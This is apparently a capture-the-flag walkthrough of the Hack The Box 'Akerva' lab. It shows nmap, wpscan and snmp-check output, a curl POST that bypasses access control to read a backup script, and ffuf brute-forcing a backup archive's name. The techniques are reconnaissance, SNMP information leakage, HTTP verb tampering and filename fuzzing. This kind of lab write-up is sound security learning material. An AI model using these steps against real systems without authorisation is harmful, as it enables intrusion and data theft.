Nmap
```bash
nmap -vvv -A -v -oN intial.nmap 10.13.37.11  
Starting Nmap 7.80 ( https://nmap.org ) at 2021-11-16 03:33 EST
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 03:33
Completed NSE at 03:33, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 03:33
Completed NSE at 03:33, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 03:33
Completed NSE at 03:33, 0.00s elapsed
Initiating Ping Scan at 03:33
Scanning 10.13.37.11 [4 ports]
Completed Ping Scan at 03:33, 0.25s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 03:33
Completed Parallel DNS resolution of 1 host. at 03:33, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 03:33
Scanning 10.13.37.11 [1000 ports]
Discovered open port 22/tcp on 10.13.37.11
Discovered open port 80/tcp on 10.13.37.11
Discovered open port 5000/tcp on 10.13.37.11
Completed SYN Stealth Scan at 03:33, 4.52s elapsed (1000 total ports)
Initiating Service scan at 03:33
Scanning 3 services on 10.13.37.11
Completed Service scan at 03:34, 23.55s elapsed (3 services on 1 host)
Initiating OS detection (try #1) against 10.13.37.11
Retrying OS detection (try #2) against 10.13.37.11
Retrying OS detection (try #3) against 10.13.37.11
Retrying OS detection (try #4) against 10.13.37.11
Retrying OS detection (try #5) against 10.13.37.11
Initiating Traceroute at 03:34
Completed Traceroute at 03:34, 0.23s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 03:34
Completed Parallel DNS resolution of 2 hosts. at 03:34, 0.02s elapsed
DNS resolution of 2 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 2, DR: 0, SF: 0, TR: 2, CN: 0]
NSE: Script scanning 10.13.37.11.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 03:34
Completed NSE at 03:34, 6.75s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 03:34
Completed NSE at 03:34, 0.95s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 03:34
Completed NSE at 03:34, 0.00s elapsed
Nmap scan report for 10.13.37.11
Host is up, received echo-reply ttl 63 (0.23s latency).
Scanned at 2021-11-16 03:33:43 EST for 51s
Not shown: 997 closed ports
Reason: 997 resets
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 0d:e4:41:fd:9f:a9:07:4d:25:b4:bd:5d:26:cc:4f:da (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCYsb2eP012xQGyABOzy+gWdxyHIa7xFBkwpLlFOBlYVsJp87Vtve02GudeSUjrz59c7y5nJkLxJAKQRXIObz/jzvCUkTMjH56Mc/3hzdkAzlWg/Gq3vNTyOLODkPPInJGGk1WgovnLcAJtNgdXaO7nYrDqyC8eCjBt7ppsONrz9FmEbiqLQl1m/LYb7Em6X1ZviytlJeH7eEk3UcKX45sNpzaUINdf1PJnXK3CLTB+vEAaieWz1GzCMsuRMphsmnW/d2ObpfZfCMa/NKYpAi0Z6yxUlI/HPEOWNnWO45OZ+7+M8NTxklZCHUbeCDhK8YSnpXtaEFPZvKajqZB+F2tR
|   256 f7:65:51:e0:39:37:2c:81:7f:b5:55:bd:63:9c:82:b5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEKLumcSSQuW4qihcz0zZyca/KvBaXlysVAvY/DqLV0vo4bPoz+PH0qP7vuSlgCIqdiyJKq5JFfJz58e4kujk90=
|   256 28:61:d3:5a:b9:39:f2:5b:d7:10:5a:67:ee:81:a8:5e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINAqCT5KghTKGzjImXygZG4vYKvk0akCYJaonX3hXvkE
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 6A6F2809F13E037DDC8D625B58FDA218
|_http-generator: WordPress 5.4-alpha-47225
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Root of the Universe &#8211; by @lydericlefebvre &amp; @akerva_fr
|_https-redirect: ERROR: Script execution failed (use -d to debug)
5000/tcp open  http    syn-ack ttl 63 Werkzeug httpd 0.16.0 (Python 2.7.15+)
| http-auth: 
| HTTP/1.0 401 UNAUTHORIZED\x0D
|_  Basic realm=Authentication Required
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
|_http-server-header: Werkzeug/0.16.0 Python/2.7.15+
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=11/16%OT=22%CT=1%CU=34876%PV=Y%DS=2%DC=T%G=Y%TM=61936D
OS:1A%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST
OS:11NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)EC
OS:N(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Uptime guess: 7.726 days (since Mon Nov  8 10:09:21 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1025/tcp)
HOP RTT       ADDRESS
1   229.45 ms 10.13.14.1
2   229.52 ms 10.13.37.11

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 03:34
Completed NSE at 03:34, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 03:34
Completed NSE at 03:34, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 03:34
Completed NSE at 03:34, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.32 seconds
           Raw packets sent: 1124 (53.482KB) | Rcvd: 1082 (46.774KB)
```
nmap udp scan
```bash
nmap -sU -sV -F --open -v -oA enum_udp 10.13.37.11
Starting Nmap 7.80 ( https://nmap.org ) at 2021-11-16 03:37 EST
NSE: Loaded 45 scripts for scanning.
Initiating Ping Scan at 03:37
Scanning 10.13.37.11 [4 ports]
Completed Ping Scan at 03:37, 0.24s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 03:37
Completed Parallel DNS resolution of 1 host. at 03:37, 0.02s elapsed
Initiating UDP Scan at 03:37
Scanning 10.13.37.11 [100 ports]
Increasing send delay for 10.13.37.11 from 0 to 50 due to max_successful_tryno increase to 4
Increasing send delay for 10.13.37.11 from 50 to 100 due to max_successful_tryno increase to 5
Increasing send delay for 10.13.37.11 from 100 to 200 due to max_successful_tryno increase to 6
Increasing send delay for 10.13.37.11 from 200 to 400 due to 11 out of 13 dropped probes since last increase.
Increasing send delay for 10.13.37.11 from 400 to 800 due to 11 out of 11 dropped probes since last increase.
UDP Scan Timing: About 52.00% done; ETC: 03:38 (0:00:30 remaining)
Discovered open port 161/udp on 10.13.37.11
Completed UDP Scan at 03:38, 86.95s elapsed (100 total ports)
Initiating Service scan at 03:38
Scanning 3 services on 10.13.37.11
Completed Service scan at 03:38, 28.22s elapsed (3 services on 1 host)
NSE: Script scanning 10.13.37.11.
Initiating NSE at 03:38
Completed NSE at 03:38, 0.35s elapsed
Initiating NSE at 03:38
Completed NSE at 03:38, 0.25s elapsed
Nmap scan report for 10.13.37.11
Host is up (0.23s latency).
Not shown: 97 closed ports
PORT      STATE         SERVICE VERSION
161/udp   open          snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
49192/udp open|filtered unknown
49201/udp open|filtered unknown
Service Info: Host: Leakage

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 116.60 seconds
           Raw packets sent: 217 (7.716KB) | Rcvd: 104 (6.641KB)
```

First flag
![image](https://user-images.githubusercontent.com/63084488/141961921-3fe9351d-3252-4391-98f0-36f8f210d77d.png)

wordpress
wpscan
```bash
wpscan --url http://10.13.37.11 -e 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.18
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.13.37.11/ [10.13.37.11]
[+] Started: Tue Nov 16 03:43:00 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.13.37.11/xmlrpc.php
 | Found By: Headers (Passive Detection)
 | Confidence: 100%
 | Confirmed By:
 |  - Link Tag (Passive Detection), 30% confidence
 |  - Direct Access (Aggressive Detection), 100% confidence
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.13.37.11/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.13.37.11/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4 identified (Insecure, released on 2020-03-31).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.13.37.11/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.4'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.13.37.11/, Match: 'WordPress 5.4'

[+] WordPress theme in use: twentyfifteen
 | Location: http://10.13.37.11/wp-content/themes/twentyfifteen/
 | Last Updated: 2021-07-22T00:00:00.000Z
 | Readme: http://10.13.37.11/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 3.0
 | Style URL: http://10.13.37.11/wp-content/themes/twentyfifteen/style.css?ver=20190507
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen/
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.13.37.11/wp-content/themes/twentyfifteen/style.css?ver=20190507, Match: 'Version: 2.5'

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:17 <======================================> (358 / 358) 100.00% Time: 00:00:17
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] No themes Found.

[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:02:01 <====================================> (2575 / 2575) 100.00% Time: 00:02:01

[i] No Timthumbs Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:06 <=======================================> (137 / 137) 100.00% Time: 00:00:06

[i] No Config Backups Found.

[+] Enumerating DB Exports (via Passive and Aggressive Methods)
 Checking DB Exports - Time: 00:00:03 <=============================================> (71 / 71) 100.00% Time: 00:00:03

[i] No DB Exports Found.

[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)
 Brute Forcing Attachment IDs - Time: 00:00:04 <==================================> (100 / 100) 100.00% Time: 00:00:04

[i] No Medias Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <========================================> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] aas
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.13.37.11/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Nov 16 03:45:52 2021
[+] Requests Done: 3296
[+] Cached Requests: 10
[+] Data Sent: 892.984 KB
[+] Data Received: 736.199 KB
[+] Memory used: 291.98 MB
[+] Elapsed time: 00:02:52
```


snmp check
```bash
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 10.13.37.11:161 using SNMPv1 and community 'public'

[*] System information:

  Host IP address               : 10.13.37.11
  Hostname                      : Leakage
  Description                   : Linux Leakage 4.15.0-72-generic #81-Ubuntu SMP Tue Nov 26 12:20:02 UTC 2019 x86_64
  Contact                       : Me <me@example.org>
  Location                      : Sitting on the Dock of the Bay
  Uptime snmp                   : 1 day, 11:57:53.99
  Uptime system                 : 1 day, 11:57:46.65
  System date                   : 2021-11-16 07:16:27.0

[*] Network information:

  IP forwarding enabled         : no
  Default TTL                   : 64
  TCP segments received         : 1741241
  TCP segments sent             : 1755983
  TCP segments retrans          : 1291
  Input datagrams               : 2109410
  Delivered datagrams           : 2109410
  Output datagrams              : 2068594

[*] Network interfaces:

  Interface                     : [ up ] lo
  Id                            : 1
  Mac Address                   : :::::
  Type                          : softwareLoopback
  Speed                         : 10 Mbps
  MTU                           : 65536
  In octets                     : 25863187
  Out octets                    : 25863187

  Interface                     : [ up ] Intel Corporation 82545EM Gigabit Ethernet Controller (Copper)
  Id                            : 2
  Mac Address                   : 00:50:56:b9:0f:be
  Type                          : ethernet-csmacd
  Speed                         : 1000 Mbps
  MTU                           : 1500
  In octets                     : 247121384
  Out octets                    : 552428761


[*] Network IP:

  Id                    IP Address            Netmask               Broadcast           
  2                     10.13.37.11           255.255.255.0         1                   
  1                     127.0.0.1             255.0.0.0             0                   

[*] Routing information:

  Destination           Next hop              Mask                  Metric              
  0.0.0.0               10.13.37.2            0.0.0.0               1                   
  10.13.37.0            0.0.0.0               255.255.255.0         0                   

[*] TCP connections and listening ports:

  Local address         Local port            Remote address        Remote port           State               
  0.0.0.0               22                    0.0.0.0               0                     listen              
  0.0.0.0               80                    0.0.0.0               0                     listen              
  0.0.0.0               5000                  0.0.0.0               0                     listen              
  10.13.37.11           80                    10.13.14.2            36856                 timeWait            
  10.13.37.11           5000                  10.13.14.7            35496                 closeWait           
  10.13.37.11           5000                  10.13.14.7            35500                 closeWait           
  10.13.37.11           5000                  10.13.14.7            35504                 closeWait           
  10.13.37.11           5000                  10.13.14.7            35506                 closeWait           
  10.13.37.11           5000                  10.13.14.11           38904                 established         
  10.13.37.11           5000                  10.13.14.11           38906                 established         
  10.13.37.11           5000                  10.13.14.11           42026                 established         
  10.13.37.11           36046                 10.13.14.7            4434                  closeWait           
  10.13.37.11           50248                 10.13.14.11           4466                  closeWait           
  10.13.37.11           60390                 10.13.14.7            4242                  closeWait           
  10.13.37.11           60406                 10.13.14.7            4242                  closeWait           
  10.13.37.11           60412                 10.13.14.7            4242                  closeWait           
  127.0.0.1             3306                  0.0.0.0               0                     listen              
  127.0.0.53            53                    0.0.0.0               0                     listen              

[*] Listening UDP ports:

  Local address         Local port          
  0.0.0.0               161                 
  0.0.0.0               54334               
  127.0.0.53            53                  

[*] Processes:

  Id                    Status                Name                  Path                  Parameters          
  1                     runnable              systemd               /sbin/init            maybe-ubiquity      
  2                     runnable              kthreadd                                                        
  4                     unknown               kworker/0:0H                                                    
  6                     unknown               mm_percpu_wq                                                    
  7                     runnable              ksoftirqd/0                                                     
  8                     unknown               rcu_sched                                                       
  9                     unknown               rcu_bh                                                          
  10                    runnable              migration/0                                                     
  11                    runnable              watchdog/0                                                      
  12                    runnable              cpuhp/0                                                         
  13                    runnable              cpuhp/1                                                         
  14                    runnable              watchdog/1                                                      
  15                    runnable              migration/1                                                     
  16                    runnable              ksoftirqd/1                                                     
  18                    unknown               kworker/1:0H                                                    
  19                    runnable              kdevtmpfs                                                       
  20                    unknown               netns                                                           
  21                    runnable              rcu_tasks_kthre                                                 
  22                    runnable              kauditd                                                         
  23                    unknown               kworker/0:1                                                     
  24                    runnable              khungtaskd                                                      
  25                    runnable              oom_reaper                                                      
  26                    unknown               writeback                                                       
  27                    runnable              kcompactd0                                                      
  28                    runnable              ksmd                                                            
  29                    runnable              khugepaged                                                      
  30                    unknown               crypto                                                          
  31                    unknown               kintegrityd                                                     
  32                    unknown               kblockd                                                         
  33                    unknown               ata_sff                                                         
  34                    unknown               md                                                              
  35                    unknown               edac-poller                                                     
  36                    unknown               devfreq_wq                                                      
  37                    unknown               watchdogd                                                       
  41                    runnable              kswapd0                                                         
  42                    unknown               kworker/u5:0                                                    
  43                    runnable              ecryptfs-kthrea                                                 
  85                    unknown               kthrotld                                                        
  86                    unknown               acpi_thermal_pm                                                 
  87                    runnable              scsi_eh_0                                                       
  88                    unknown               scsi_tmf_0                                                      
  89                    runnable              scsi_eh_1                                                       
  90                    unknown               scsi_tmf_1                                                      
  96                    unknown               ipv6_addrconf                                                   
  105                   unknown               kstrp                                                           
  122                   unknown               charger_manager                                                 
  173                   unknown               ttm_swap                                                        
  174                   runnable              irq/16-vmwgfx                                                   
  213                   runnable              scsi_eh_2                                                       
  214                   unknown               scsi_tmf_2                                                      
  215                   runnable              scsi_eh_3                                                       
  216                   unknown               scsi_tmf_3                                                      
  217                   runnable              scsi_eh_4                                                       
  218                   unknown               scsi_tmf_4                                                      
  219                   runnable              scsi_eh_5                                                       
  220                   unknown               scsi_tmf_5                                                      
  221                   runnable              scsi_eh_6                                                       
  222                   unknown               scsi_tmf_6                                                      
  223                   runnable              scsi_eh_7                                                       
  224                   unknown               scsi_tmf_7                                                      
  225                   runnable              scsi_eh_8                                                       
  226                   unknown               scsi_tmf_8                                                      
  227                   runnable              scsi_eh_9                                                       
  228                   unknown               scsi_tmf_9                                                      
  229                   runnable              scsi_eh_10                                                      
  230                   unknown               scsi_tmf_10                                                     
  231                   runnable              scsi_eh_11                                                      
  232                   unknown               scsi_tmf_11                                                     
  233                   runnable              scsi_eh_12                                                      
  234                   unknown               scsi_tmf_12                                                     
  235                   runnable              scsi_eh_13                                                      
  236                   unknown               scsi_tmf_13                                                     
  237                   runnable              scsi_eh_14                                                      
  238                   unknown               scsi_tmf_14                                                     
  239                   runnable              scsi_eh_15                                                      
  240                   unknown               scsi_tmf_15                                                     
  241                   runnable              scsi_eh_16                                                      
  242                   unknown               scsi_tmf_16                                                     
  243                   runnable              scsi_eh_17                                                      
  244                   unknown               scsi_tmf_17                                                     
  245                   runnable              scsi_eh_18                                                      
  246                   unknown               scsi_tmf_18                                                     
  247                   runnable              scsi_eh_19                                                      
  248                   unknown               scsi_tmf_19                                                     
  249                   runnable              scsi_eh_20                                                      
  250                   unknown               scsi_tmf_20                                                     
  251                   runnable              scsi_eh_21                                                      
  252                   unknown               scsi_tmf_21                                                     
  253                   runnable              scsi_eh_22                                                      
  254                   unknown               scsi_tmf_22                                                     
  255                   runnable              scsi_eh_23                                                      
  256                   unknown               scsi_tmf_23                                                     
  257                   runnable              scsi_eh_24                                                      
  258                   unknown               scsi_tmf_24                                                     
  259                   runnable              scsi_eh_25                                                      
  260                   unknown               scsi_tmf_25                                                     
  261                   runnable              scsi_eh_26                                                      
  262                   unknown               scsi_tmf_26                                                     
  263                   runnable              scsi_eh_27                                                      
  264                   unknown               scsi_tmf_27                                                     
  265                   runnable              scsi_eh_28                                                      
  266                   unknown               scsi_tmf_28                                                     
  267                   runnable              scsi_eh_29                                                      
  268                   unknown               scsi_tmf_29                                                     
  269                   runnable              scsi_eh_30                                                      
  270                   unknown               scsi_tmf_30                                                     
  271                   runnable              scsi_eh_31                                                      
  272                   unknown               scsi_tmf_31                                                     
  302                   unknown               kworker/0:1H                                                    
  305                   unknown               kworker/1:1H                                                    
  374                   unknown               raid5wq                                                         
  425                   runnable              jbd2/sda2-8                                                     
  426                   unknown               ext4-rsv-conver                                                 
  493                   runnable              systemd-journal       /lib/systemd/systemd-journald                      
  506                   unknown               iscsi_eh                                                        
  510                   unknown               ib-comp-wq                                                      
  511                   unknown               ib-comp-unb-wq                                                  
  512                   unknown               ib_mcast                                                        
  513                   unknown               ib_nl_sa_wq                                                     
  514                   runnable              lvmetad               /sbin/lvmetad         -f                  
  516                   unknown               rdma_cm                                                         
  524                   runnable              systemd-udevd         /lib/systemd/systemd-udevd                      
  541                   runnable              loop0                                                           
  547                   runnable              loop1                                                           
  585                   runnable              systemd-timesyn       /lib/systemd/systemd-timesyncd                      
  626                   runnable              VGAuthService         /usr/bin/VGAuthService                      
  627                   runnable              vmtoolsd              /usr/bin/vmtoolsd                         
  775                   runnable              systemd-network       /lib/systemd/systemd-networkd                      
  790                   runnable              systemd-resolve       /lib/systemd/systemd-resolved                      
  922                   runnable              dbus-daemon           /usr/bin/dbus-daemon  --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  928                   runnable              rsyslogd              /usr/sbin/rsyslogd    -n                  
  929                   runnable              systemd-logind        /lib/systemd/systemd-logind                      
  932                   runnable              networkd-dispat       /usr/bin/python3      /usr/bin/networkd-dispatcher --run-startup-triggers
  938                   runnable              cron                  /usr/sbin/cron        -f                  
  939                   runnable              atd                   /usr/sbin/atd         -f                  
  940                   runnable              accounts-daemon       /usr/lib/accountsservice/accounts-daemon                      
  941                   runnable              snapd                 /usr/lib/snapd/snapd                      
  943                   runnable              irqbalance            /usr/sbin/irqbalance  --foreground        
  972                   runnable              sshd                  /usr/sbin/sshd        -D                  
  973                   running               snmpd                 /usr/sbin/snmpd       -Lsd -Lf /dev/null -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f
  984                   runnable              unattended-upgr       /usr/bin/python3      /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
  1002                  runnable              agetty                /sbin/agetty          -o -p -- \u --noclear tty1 linux
  1014                  runnable              polkitd               /usr/lib/policykit-1/polkitd  --no-debug          
  1024                  runnable              mysqld                /usr/sbin/mysqld      --daemonize --pid-file=/run/mysqld/mysqld.pid
  1031                  runnable              apache2               /usr/sbin/apache2     -k start            
  1235                  runnable              cron                  /usr/sbin/CRON        -f                  
  1236                  runnable              cron                  /usr/sbin/CRON        -f                  
  1237                  runnable              sh                    /bin/sh               -c /opt/check_backup.sh
  1238                  runnable              sh                    /bin/sh               -c /opt/check_devSite.sh
  1239                  runnable              check_backup.sh       /bin/bash             /opt/check_backup.sh
  1240                  runnable              check_devSite.s       /bin/bash             /opt/check_devSite.sh
  1243                  runnable              space_dev.py          /usr/bin/python       /var/www/html/dev/space_dev.py
  1244                  runnable              backup_every_17       /bin/bash             /var/www/html/scripts/backup_every_17minutes.sh AKERVA{IkN0w_SnMP@@@MIsconfigur@T!onS}
  1249                  runnable              python                /usr/bin/python       /var/www/html/dev/space_dev.py
  1251                  runnable              uuidd                 /usr/sbin/uuidd       --socket-activation 
  2017                  runnable              bash                  /bin/bash                                 
  2090                  runnable              bash                  /bin/bash                                 
  2163                  runnable              sudo                  sudo                  -S                  
  2164                  runnable              sh                    sh                                        
  3584                  runnable              sh                    /bin/sh                                   
  3626                  runnable              python                python                -c import pty;pty.spawn('/bin/bash')
  3633                  runnable              bash                  /bin/bash                                 
  3749                  runnable              vim                   vim                   Makefile           
  ------------------------------------------snip-------------------------------------------------------------
  ```
  
```bash
curl http://10.13.37.11/scripts/backup_every_17minutes.sh -X POST
#!/bin/bash
#
# This script performs backups of production and development websites.
# Backups are done every 17 minutes.
#
# AKERVA{IKNoW###VeRbTamper!nG_==}
#

SAVE_DIR=/var/www/html/backups

while true
do
	ARCHIVE_NAME=backup_$(date +%Y%m%d%H%M%S)
	echo "Erasing old backups..."
	rm -rf $SAVE_DIR/*

	echo "Backuping..."
	zip -r $SAVE_DIR/$ARCHIVE_NAME /var/www/html/*

	echo "Done..."
	sleep 1020
done
```


```bash
crunch 4 4 0123456789 -o 4-digit
Crunch will now generate the following amount of data: 50000 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 10000 

crunch: 100% completed generating output
                                                                                                                      
┌──(root💀kali)-[~/Downloads/hackthebox/Fotress/Akerva]
└─# nmap -p 80 --script http-date 10.13.37.11
Starting Nmap 7.80 ( https://nmap.org ) at 2021-11-16 03:56 EST
Nmap scan report for 10.13.37.11
Host is up (0.23s latency).

PORT   STATE SERVICE
80/tcp open  http
|_http-date: Tue, 16 Nov 2021 07:27:26 GMT; -1h28m58s from local time.

Nmap done: 1 IP address (1 host up) scanned in 1.79 seconds
                                                                                                                      
┌──(root💀kali)-[~/Downloads/hackthebox/Fotress/Akerva]
└─# ffuf -u http://10.13.37.11/backups/backup_2021111607FUZZ.zip -w 4-digit

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.13.37.11/backups/backup_2021111607FUZZ.zip
 :: Wordlist         : FUZZ: 4-digit
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

2236                    [Status: 200, Size: 22071775, Words: 0, Lines: 0]
:: Progress: [10000/10000] :: Job [1/1] :: 174 req/sec :: Duration: [0:01:01] :: Errors: 0 ::
````
